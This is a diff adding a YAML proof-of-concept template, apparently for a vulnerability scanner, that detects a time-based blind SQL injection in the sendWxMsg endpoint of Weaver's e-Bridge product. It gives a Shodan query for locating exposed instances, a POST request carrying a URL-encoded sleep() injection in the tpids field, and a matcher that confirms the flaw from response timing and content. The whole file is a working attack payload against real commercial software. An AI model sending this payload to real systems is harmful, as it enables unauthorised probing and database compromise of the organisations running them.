@@ -1,0 +1,33 @@
+id: poc-yaml-weaver-e-bridge-sendwxmsg-sqli
+info:
+  name: 泛微云桥 e-Bridge sendWxMsg SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: weaver-ebridge
+  shodan: app="泛微-云桥e-Bridge"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /wxthirdapi/sendWxMsg
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: userids=-1&tpids=1%27+or+%28select+%2A+from+%28select+sleep%28{{.t1}}%29%29x%29+or+%27x%27%3D%27x
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"syscorpids\":") &&
+
+    contains(body,"没有对应的消息模板") &&
+
+    !contains(body,"<") &&
+
+    contains(content_type,"application/json") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
